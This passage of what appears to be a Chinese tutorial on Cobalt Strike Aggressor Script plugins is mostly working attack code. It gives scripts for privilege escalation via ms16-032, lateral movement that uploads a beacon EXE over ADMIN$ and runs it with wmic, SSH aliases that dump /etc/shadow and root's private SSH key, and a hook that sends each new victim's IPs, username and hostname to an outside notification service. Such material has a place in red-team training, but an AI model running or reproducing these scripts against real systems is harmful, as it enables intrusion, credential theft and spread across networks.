	
	# Build up our entire command line.
	$cmd    = " -nop -exec bypass -EncodedCommand \" $+ $runme $+ \"";
	
	# task Beacon to run all of this.
	btask($1, "Tasked beacon to run: $args", "T1086");
	beacon_execute_job($1, "powershell", $cmd, 1);
}
```

下面是 shell 的源码：

```shell
alias shell {
	local('$args');
	$args = substr($0, 6);
	btask($1, "Tasked beacon to run: $args (OPSEC)", "T1059");
	bsetenv!($1, "_", $args);
	beacon_execute_job($1, "%COMSPEC%", " /C %_%", 0);
}
```



## Privilege Escalation (Run a Command)

> 权限提升的脚本源码



官方的 ms16-032 权限提升写法

```shell
# Integrate ms16-032
# Sourced from Empire: https://github.com/EmpireProject/Empire/tree/master/data/module_source/privesc
sub ms16_032_elevator {
	local('$handle $script $oneliner');
	
	# acknowledge this command
	btask($1, "Tasked Beacon to execute $2 via ms16-032", "T1068");
	
	# read in the script
	$handle = openf(getFileProper(script_resource("modules"), "Invoke-MS16032.ps1"));
	$script = readb($handle, -1);
	closef($handle);
	
	# host the script in Beacon
	$oneliner = beacon_host_script($1, $script);
	
	# run the specified command via this exploit.
	bpowerpick!($1, "Invoke-MS16032 -Command \" $+ $2 $+ \"", $oneliner);
}
```

## Privilege Escalation (Spawn a Session)

> 官方权限提升，产生新会话

源码：

```shell
beacon_exploit_register("ms15-051", "Windows ClientCopyImage Win32k Exploit (CVE 2015-1701)", &ms15_051_exploit);
```



## Lateral Movement (Spawn a Session)

> 官方横向移动源码

```shell
beacon_remote_exploit_register("wmi", "x86", "Use WMI to run a Beacon payload", lambda(&wmi_remote_spawn, $arch => "x86"));
beacon_remote_exploit_register("wmi64", "x64", "Use WMI to run a Beacon payload", lambda(&wmi_remote_spawn, $arch => "x64"));
```

```shell
# $1 = bid, $2 = target, $3 = listener
sub wmi_remote_spawn {
	local('$name $exedata');

	btask($1, "Tasked Beacon to jump to $2 (" . listener_describe($3) . ") via WMI", "T1047");

	# we need a random file name.
	$name = rand(@("malware", "evil", "detectme")) . rand(100) . ".exe";

	# generate an EXE. $arch defined via &lambda when this function was registered with
	# beacon_remote_exploit_register
	$exedata = artifact_payload($3, "exe", $arch);

	# upload the EXE to our target (directly)
	bupload_raw!($1, "\\\\ $+ $2 $+ \\ADMIN\$\\ $+ $name", $exedata);

	# execute this via WMI
	brun!($1, "wmic /node:\" $+ $2 $+ \" process call create \"\\\\ $+ $2 $+ \\ADMIN\$\\ $+ $name $+ \"");

	# assume control of our payload (if it's an SMB or TCP Beacon)
	beacon_link($1, $2, $3);
}
```



上面涉及到的 数据模型 和 事件，在官方文档中都可以找到。





# SSH Sessions

> 和 beacon 一样也是信标，但是是从 Liunx 主机上返回的



如何上线一台 Liunx 主机呢?我们可以按照传统的方法使用官方给的方式，直接在 Beacon 中去链接内网中的liunx主机，语法如下：

```shell
beacon> ssh <IP>:<port><username><password>
```

我在本地开一台liunx主机，然后我们在横向上线：

![image-20201215222850956](/images/Aggressor-Script/image-20201215222850956.png)

可以发现我们得到一台liunx主机，这里上线 Liunx 主机的的作用大概是为了好看一点，能够很快速的定位liunx主机是由那个windows打通的，其他的就不给予评价，个人感觉可以直接ssh登录就行

当我们登录成功以后，我们就可以在 Liunx主机上执行命令，和 beacon 差不多：

![image-20201215223153091](/images/Aggressor-Script/image-20201215223153091.png)



除了官方的方式上线，我们可以使用 Cross C2，下载地址：https://github.com/gloxec/CrossC2/releases/tag/v2.1

官方文档：https://gloxec.github.io/CrossC2/zh_cn/



## 会话类型的判断

当我们上线主机后，可以使用 **-isssh** 数据模型检查是否为Liunx主机，它接受一个参数

`$1` 信标的会话ID，如果是的话就执行下面的代码或者函数



我们来判断一下我们的主机是否为 Liunx 还是 Win

```shell
command what {
	foreach @ID (beacon_ids()){
		if (-isssh @ID){
			println(@ID." 是liunx主机"." 机器名是：".beacon_info(@ID,"computer")." 用户名是：".beacon_info(@ID,"user"));
		}
		else{
			println(@ID." 是windo主机 "." 机器名是：".beacon_info(@ID,"computer")." 用户名是：".beacon_info(@ID,"user"));
		}
		}
}
```

运行一下：

![image-20201215230423505](/images/Aggressor-Script/image-20201215230423505.png)

判断出了我们的主机信息



## SSH Aliases

> 和 beacon alias 一样，我们也可以为 liunx 主机创建 SSH 控制台命令，比如查看我们的 /etc/password：

下面的 `$1` 是信标的会话 ID

```shell
ssh_alias hashdump {
	if (-isadmin $1) { # 判断是否为管理员，因为password非管理员不等查看
		binput($1,"导出passwod的HASH：")
		bshell($1, "cat /etc/shadow");
	}
	else {
		berror($1, "你不是管理员！！");
	}
}
```

![image-20201215231244460](/images/Aggressor-Script/image-20201215231244460.png)

当然你也可以写其他命令，bshell 数据模型是用来执行命令的，他需要的参数如下：

`$1` 信标的会话ID

`$2` 需要执行的命令



比如我们查看 liunx 主机的SSH密匙的信息：

```shell
ssh_alias ssh_demo{
	binput($1,"打印SSH私钥信息");
	bshell($1,"cat /root/.ssh/id_rsa");
}
```

运行：

![image-20201215231926776](/images/Aggressor-Script/image-20201215231926776.png)



## ssh_command_register

当自定义一个 ssh命令 以后，只有自己知道这个 命令的具体使用方式，当想要所有人都知道这条命令的含义的时候，我们可以使用 ssh_command_register 数据模型  显示帮助信息，他需要接受三个参数

`$1` 自定义的命令

`$2` 命令的介绍

`$3` 帮助信息，类似告诉他怎么用

举一个例子，现在我写一个命令用于从根目录查找我们想要的文件：

```shell
ssh_alias find {
	bshell($1,"find / -name $2");
}

ssh_command_register (
	"find",
	"查找你想要的文件从根目录开始",
	"使用方式: find test.txt"
);

```

![image-20201216121638204](/images/Aggressor-Script/image-20201216121638204.png)

在 ssh 控制台中输入 ? 号就可以查看到命令和他的解释，使用 `help find` 可以查看到这个命令的使用方式解析：

![image-20201216121955524](/images/Aggressor-Script/image-20201216121955524.png)

我们运行一下：

![image-20201216122032723](/images/Aggressor-Script/image-20201216122032723.png)



## Reacting to new SSH Sessions

和 beacon 一样，当有新的Liunx主机上线时，我们做的事情，使用 ssh_initial 实事件触发，如下：

```shell
on ssh_initial {
	show_message("有新的LIUNX主机上线\nIP为".beacon_info($1,"internal")."\n主机名字为：".beacon_info($1,"computer"));

}
```

![image-20201216123313505](/images/Aggressor-Script/image-20201216123313505.png)



## Popup Menus

适合liunx主机的右键菜单

```shell
popup ssh {
	item "执行命令" {
		prompt_text("你想运行哪一个命令?", "w", lambda({
			binput(@ids, "shell $1");
			bshell(@ids, $1);
		}, @ids => $1));
	}
}
```



![image-20201216124754601](/images/Aggressor-Script/image-20201216124754601.png)

使用方式和Beacon基本相同，所以不再赘述





# Server酱上线代码解析

> 代码来源：算命瞎子：http://www.nmd5.com/?p=567

源代码：

```shell
# 循环获取所有beacon
on beacon_initial {

    sub http_get {
        local('$output');
        $url = [new java.net.URL: $1];
        $stream = [$url openStream];
        $handle = [SleepUtils getIOHandle: $stream, $null];

        @content = readAll($handle);

        foreach $line (@content) {
            $output .= $line . "\r\n";
        }

        println($output);
    }
    #获取ip、计算机名、登录账号
    $externalIP = replace(beacon_info($1, "external"), " ", "_");
    $internalIP = replace(beacon_info($1, "internal"), " ", "_");
    $userName = replace(beacon_info($1, "user"), " ", "_");
    $computerName = replace(beacon_info($1, "computer"), " ", "_");

    #get一下Server酱的链接
    $url = 'https://sc.ftqq.com/此处填写你Server酱的SCKEY码.send?text=CobaltStrike%e4%b8%8a%e7%ba%bf%e6%8f%90%e9%86%92&desp=%e4%bb%96%e6%9d%a5%e4%ba%86%e3%80%81%e4%bb%96%e6%9d%a5%e4%ba%86%ef%bc%8c%e4%bb%96%e8%84%9a%e8%b8%8f%e7%a5%a5%e4%ba%91%e8%b5%b0%e6%9d%a5%e4%ba%86%e3%80%82%0D%0A%0D%0A%e5%a4%96%e7%bd%91ip:'.$externalIP.'%0D%0A%0D%0A%e5%86%85%e7%bd%91ip:'.$internalIP.'%0D%0A%0D%0A%e7%94%a8%e6%88%b7%e5%90%8d:'.$userName.'%0D%0A%0D%0A%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%90%8d:'.$computerName;

    http_get($url);

}

```

整体代码流程是，监听上线事件，当有新的主机上线的时候我们就执行代码：

```shell
#上线事件的监听

on beacon_initial {
	...... # 代码
}

```

然后呢定义一个请求函数

```shell
    sub http_get {
        local('$output');
        $url = [new java.net.URL: $1]; # 实例化URL请求，$1为待输入的URl
        $stream = [$url openStream];
        $handle = [SleepUtils getIOHandle: $stream, $null];

        @content = readAll($handle);

        foreach $line (@content) {
            $output .= $line . "\r\n";
        }

        println($output);
    }
```



将刚上线的主机的 外网IP 内网IP 用户名 主机信息 提取出来，优化输出

```shell
    #获取ip、计算机名、登录账号
    $externalIP = replace(beacon_info($1, "external"), " ", "_");
    $internalIP = replace(beacon_info($1, "internal"), " ", "_");
    $userName = replace(beacon_info($1, "user"), " ", "_");
    $computerName = replace(beacon_info($1, "computer"), " ", "_");

```

最后格式化一下URL再请求

```shell
    $url = 'https://sc.ftqq.com/此处填写你Server酱的SCKEY码.send?text=CobaltStrike%e4%b8%8a%e7%ba%bf%e6%8f%90%e9%86%92&desp=%e4%bb%96%e6%9d%a5%e4%ba%86%e3%80%81%e4%bb%96%e6%9d%a5%e4%ba%86%ef%bc%8c%e4%bb%96%e8%84%9a%e8%b8%8f%e7%a5%a5%e4%ba%91%e8%b5%b0%e6%9d%a5%e4%ba%86%e3%80%82%0D%0A%0D%0A%e5%a4%96%e7%bd%91ip:'.$externalIP.'%0D%0A%0D%0A%e5%86%85%e7%bd%91ip:'.$internalIP.'%0D%0A%0D%0A%e7%94%a8%e6%88%b7%e5%90%8d:'.$userName.'%0D%0A%0D%0A%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%90%8d:'.$computerName;

    http_get($url);
```



这样就完成了一个 Server酱 上线提示的操作



这里我分享一个国外师傅打包好的请求方法：

```shell
#
# Safe & sound HTTP request implementation for Cobalt Strike 4.0 Aggressor Script.
# Works with HTTP & HTTPS, GET/POST/etc. + redirections.
#
# Author: Mariusz B. / mgeeky, '20
# <mb [at] binary-offensive.com>
#

import java.net.URLEncoder;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;


#
# httpRequest($method, $url, $body);
#
sub httpRequest {
    $method = $1;
    $url = $2;
    $body = $3;
    $n = 0;

    if(size(@_) == 4) { $n = $4; }

    $bodyLen = strlen($body);
    $maxRedirectsAllowed = 10;
    if ($n > $maxRedirectsAllowed) {
        warn("Exceeded maximum number of redirects: $method $url ");
        return "";
    }

    try
    {
        $urlobj = [new java.net.URL: $url];
        $con = $null;
        $con = [$urlobj openConnection];
        [$con setRequestMethod: $method];
        [$con setInstanceFollowRedirects: true];
        [$con setRequestProperty: "Accept", "*/*"];
        [$con setRequestProperty: "Cache-Control", "max-age=0"];
        [$con setRequestProperty: "Connection", "keep-alive"];
        [$con setRequestProperty: "User-Agent", $USER_AGENT];

        if($bodyLen > 0) {
            [$con setDoOutput: true];
            [$con setRequestProperty: "Content-Type", "application/x-www-form-urlencoded"];
        }

        $outstream = [$con getOutputStream];
        if($bodyLen > 0) {
            [$outstream write: [$body getBytes]];
        }

        $inputstream = [$con getInputStream];
        $handle = [SleepUtils getIOHandle: $inputstream, $outstream];
        $responseCode = [$con getResponseCode];

        if(($responseCode >= 301) && ($responseCode <= 304)) {
            $loc = [$con getHeaderField: "Location"];
            return httpRequest($method, $loc, $body, $n + 1);
        }

        @content = readAll($handle);
        $response = "";
        foreach $line (@content) {
            $response .= $line . "\r\n";
        }

        if((strlen($response) > 2) && (right($response, 2) eq "\r\n")) {
            $response = substr($response, 0, strlen($response) - 2);
        }

        return $response;
    }
    catch $message
    {
       warn("HTTP Request failed: $method $url : $message ");
       printAll(getStackTrace());
       return "";
    }
}
```

github链接：https://github.com/mgeeky/cobalt-arsenal/blob/master/httprequest.cna

# 后记

关于脚本编写的官方文档到这里就结束了，后面是自定义报告和一些其他零碎的东西，C2插件的编写最主要的是 数据模型 和事件，我们需要将不同的事件和数据模型结合，产生不同的结果；例如我们如何让上线的主机直接添加自启动、修改注册表、激活guest用户等，都可以自己写插件实现，由于 Aggressor Script是基于Sleep脚本语言来写的，所以需要好好的阅读Sleep官方的文档。翻译内容可能会存在错误，还请各位师傅斧正



 ## 参考文档

CS插件编写官方文档：https://www.cobaltstrike.com/help-scripting

Sleep语法文档：http://sleep.dashnine.org/manual/index.html











